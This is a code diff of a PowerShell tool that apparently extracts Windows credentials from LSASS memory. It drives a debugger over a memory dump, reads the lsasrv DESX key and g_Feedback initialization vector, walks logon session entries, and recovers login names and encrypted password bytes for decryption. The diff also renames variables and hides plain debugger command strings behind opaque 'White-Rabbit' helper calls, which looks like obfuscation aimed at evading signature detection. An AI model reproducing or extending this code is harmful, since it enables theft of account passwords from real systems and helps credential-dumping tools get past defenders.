@@ -3,13 +3,14 @@
     if($mode -eq 3) {
         $chain15 = White-Rabbit2
         $chain =  White-RabbitObs1  
+        $chain42 = White-Rabbit42
         Write-InFile $buffer $chain         
         $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath   
         $arrayFirstAddress = ($tab -split ' ')    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 4
-        $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 5
-        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
+        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
+        $firstAddress1 = $arrayFirstAddress[$fi]    
+        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
+        $firstAddress2 = $arrayFirstAddress[$fi]    
         $firstAddress = "$firstAddress2$firstAddress1"         
         $int = 96
         $slashC = "/c"
@@ -30,18 +31,17 @@
                 $value++
                 $comma = " "                
             }            
-            $foundInstruction = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
-            $keyAddress2 = $arrayDesXAddressAddress[$foundInstruction].Substring(0,2)                      
-            $keyAddress1 = $arrayDesXAddressAddress[$foundInstruction].Substring(2,2)                                  
+            $fi = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
+            $keyAddress2 = $arrayDesXAddressAddress[$fi].Substring(0,2)                      
+            $keyAddress1 = $arrayDesXAddressAddress[$fi].Substring(2,2)                                  
             $keyAddress += "$keyAddress1$keyAddress2"
             $j++
         }                 
         $DESXKeyHex = $keyAddress     
-        $initializationVectorCommand = "db lsasrv!g_Feedback"                  
-        [io.file]::WriteAllText($buffer, $initializationVectorCommand) | Out-Null                                                                                                                                      
-        $initializationVector = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 
-
-        $arrayInitializationVector = ($initializationVector -split ' ')    
+        $feed = White-RabbitPi                 
+        Write-InFile $buffer $feed        
+        $tab = Call-MemoryWalker $memoryWalker $file $fullScriptPath                                                                                                                                      
+        $array = ($tab -split ' ')    
 
         $j = 0
         $initializationVectorAddress = ""
@@ -55,18 +55,19 @@
                 $value++
                 $comma = ", "        
             }
-            $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
+            $chain = White-RabbitCO
+            $fi = [array]::indexof($array,$chain) + $value   
             if($j -eq 7) {
-                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
+                $ia1 = $array[$fi].Substring(0,2)
             }
             else {
-                $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction]
+                $ia1 = $array[$fi]
             }
-            $initializationVectorAddress += "$initializationVectorAddress1"
+            $iva += "$ia1"
             $j++
         }   
 
-        $g_Feedback = $initializationVectorAddress        
+        $g_Feedback = $iva        
         
         $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
 
@@ -101,10 +102,10 @@
 
         $firstAddress = ""
         $arrayFirstAddress = ($tab -split ' ')    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 4
-        $firstAddress1 = $arrayFirstAddress[$foundInstruction]
-        $foundInstruction = [array]::indexof($arrayFirstAddress,$chain42) + 5
-        $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
+        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 4
+        $firstAddress1 = $arrayFirstAddress[$fi]
+        $fi = [array]::indexof($arrayFirstAddress,$chain42) + 5
+        $firstAddress2 = $arrayFirstAddress[$fi]    
         $firstAddress = "$firstAddress2$firstAddress1"         
         $firstAddressList = $firstAddress
         $nextEntry = ""
@@ -124,63 +125,63 @@
             if($i -eq 0) {
                 $firstAddress = $firstAddress               
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
-                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
-                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
+                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
+                $nextEntry1 = $arrayNextEntryAddress[$fi]     
+                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
+                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                 $nextEntry = "$nextEntry2$nextEntry1"                   
             }
             else {        
                 $firstAddress = $nextEntry
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
-                $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
-                $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
+                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 4
+                $nextEntry1 = $arrayNextEntryAddress[$fi]     
+                $fi = [array]::indexof($arrayNextEntryAddress,$chain42) + 5
+                $nextEntry2 = $arrayNextEntryAddress[$fi]    
                 $nextEntry = "$nextEntry2$nextEntry1"                
             }    
 
             Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
-            $arrayLoginAddress = ($ddSecond -split ' ')           
+            $tab = ($ddSecond -split ' ')           
             $start = 28                     
-            $foundInstruction = [array]::indexof($arrayLoginAddress,$chain42) + $start
-            $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
-            $loginAddress = "$loginAddress1"                            
+            $fi = [array]::indexof($tab,$chain42) + $start
+            $la1 = $tab[$fi]             
+            $la = "$la1"                            
             $ok = White-RabbitOK
-            if($loginAddress -eq "00000000"){
+            if($la -eq "00000000"){
                 $start = 16                     
-                $foundInstruction = [array]::indexof($arrayLoginAddress,$chain42) + $start
-                $loginAddress1 = $arrayLoginAddress[$foundInstruction]             
-                $loginAddress = "$loginAddress1"    
+                $fi = [array]::indexof($tab,$chain42) + $start
+                $la1 = $tab[$fi]             
+                $la = "$la1"    
                 
-                $loginAddressCommand = "$ok $loginAddress"                  
-                [io.file]::WriteAllText($buffer, $loginAddressCommand) | Out-Null
-                $loginDB = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"
+                $laCommand = "$ok $la"                  
+                [io.file]::WriteAllText($buffer, $laCommand) | Out-Null
+                $lDB = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q"
 
-                $arrayloginDBAddress = ($loginDB -split ' ')            
-                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
-                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
-                $loginPlainText = $loginPlainText1
+                $arraylDBAddress = ($lDB -split ' ')            
+                $fi = [array]::indexof($arraylDBAddress,"du") + 4
+                $lPT1 = $arraylDBAddress[$fi]
+                $lPT = $lPT1
             }
             else {                
-                $chain = "du $loginAddress"   
+                $chain = "du $la"   
                 Write-InFile $buffer $chain         
-                $loginDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath               
+                $lDB = Call-MemoryWalker $memoryWalker $file $fullScriptPath               
                                 
-                $arrayloginDBAddress = ($loginDB -split ' ')            
-                $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
-                $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
-                $loginPlainText = $loginPlainText1
+                $arraylDBAddress = ($lDB -split ' ')            
+                $fi = [array]::indexof($arraylDBAddress,"du") + 4
+                $lPT1 = $arraylDBAddress[$fi]
+                $lPT = $lPT1
             }     
 
             Write-Progress -Activity "Getting valuable informations" -status "Running..." -id 1       
             $arrayPasswordAddress = ($ddSecond -split ' ')                            
-            $foundInstruction = [array]::indexof($arrayPasswordAddress,$chain42) + 19
-            $lengthPassword = $arrayPasswordAddress[$foundInstruction]
+            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 19
+            $lengthPassword = $arrayPasswordAddress[$fi]
             $lengthPassword = $lengthPassword.Substring(6,2)        
             $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4                
-            $foundInstruction = [array]::indexof($arrayPasswordAddress,$chain42) + 22
-            $secondAddress1 = $arrayPasswordAddress[$foundInstruction]                
+            $fi = [array]::indexof($arrayPasswordAddress,$chain42) + 22
+            $secondAddress1 = $arrayPasswordAddress[$fi]                
             $secondAddress = "$secondAddress1"   
             
             $chain = "$chain15 $secondAddress"                 
@@ -211,16 +212,16 @@
                         $comma = ", "
                     }
                 }
-                $foundInstruction = [array]::indexof($arrayPasAddress,"$chain15") + $value                
-                $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
-                $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
+                $fi = [array]::indexof($arrayPasAddress,"$chain15") + $value                
+                $passAddress2 = $arrayPasAddress[$fi].Substring(0,2)
+                $passAddress1 = $arrayPasAddress[$fi].Substring(2,2)            
                 $stringPasswordHex += "$passAddress1$passAddress2"
                 $j++
                 $modJ++
             }        
 
             $passwordHex = $stringPasswordHex                            
-            Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $loginPlainText"                        
+            Write-Log -streamWriter $global:streamWriter -infoToLog "Login : $lPT"                        
             $cipherToDecrypt = $passwordHex                      
             $hexarray = $cipherToDecrypt -split '(.{2})' | ? {$_}
             if($hexarray){
